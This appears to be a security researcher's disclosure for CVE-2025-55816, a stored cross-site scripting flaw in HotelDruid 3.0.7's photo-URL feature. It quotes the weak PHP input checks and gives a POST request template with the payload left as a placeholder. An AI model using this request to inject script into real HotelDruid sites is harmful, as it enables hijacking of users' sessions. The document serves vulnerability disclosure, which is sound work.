# CVE-2025-55816
CVE-2025-55816 HotelDruid 3.0.7

- Author: partywave
- Collab: Raptx team

### External references

- [HotelDruid 3.0.8 changelog](https://www.hoteldruid.com/demo/mostra_sorgente.php?file_sorgente=doc/CHANGELOG)
- [CVE blogpost](https://www.partywave.site/show/research/cve-2025-55816-xss-and-raptx)
- [Raptx site](https://raptx.org/)

### Vulnerability
The vulnerability is a simple `Stored Cross Site Scripting (XSS)` in `/modifica_app.php` endpoint.

The attacker can insert a javascript payload disguised as URL in the _'New Photo Url'_ feature due to lack of security measures.

The vulneable code is avaiable in HotelDruid <= 3.0.7 in www\modifica_app.php file at: 
```php
if (!empty($aggurlfoto)) {
    $mostra_form_modifica = "NO";
    $dest = "#aggfoto";
    $errore = "";

    if (@get_magic_quotes_gpc()) {
        $n_urlfoto = stripslashes($n_urlfoto);
    }

    $lowurl = strtolower($n_urlfoto);

    if (
        substr($lowurl, -4) != ".jpg" &&
        substr($lowurl, -5) != ".jpeg" &&
        substr($lowurl, -4) != ".gif" &&
        substr($lowurl, -4) != ".png" &&
        substr($lowurl, -5) != ".webp"
    ) {
        $errore = "SI";
    }

    if (
        str_replace("<", "", $n_urlfoto) != $n_urlfoto ||
        str_replace(">", "", $n_urlfoto) != $n_urlfoto ||
        str_replace("\"", "", $n_urlfoto) != $n_urlfoto
    ) {
        $errore = "SI";
    }
```

The vulnerability can lead to further exploitation. A little bit of code analysis and payload development is available at the blogpost.

### HTTP Request
You can submit the payload using the following POST request:

```http
POST /modifica_app.php HTTP/1.1
Host: 127.0.0.1:57146
....
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryae028810ee8a343ef5708f8da08a7d1d
Content-Length: 1121
....

------geckoformboundaryae028810ee8a343ef5708f8da08a7d1d
Content-Disposition: form-data; name="anno"

[year]
------geckoformboundaryae028810ee8a343ef5708f8da08a7d1d
Content-Disposition: form-data; name="id_sessione"

[sessionid]
------geckoformboundaryae028810ee8a343ef5708f8da08a7d1d
Content-Disposition: form-data; name="idappartamenti"

[apartmentid]
------geckoformboundaryae028810ee8a343ef5708f8da08a7d1d
Content-Disposition: form-data; name="aggurlfoto"

SI
------geckoformboundaryae028810ee8a343ef5708f8da08a7d1d
Content-Disposition: form-data; name="n_urlfoto"

[payload]
------geckoformboundaryae028810ee8a343ef5708f8da08a7d1d--
```
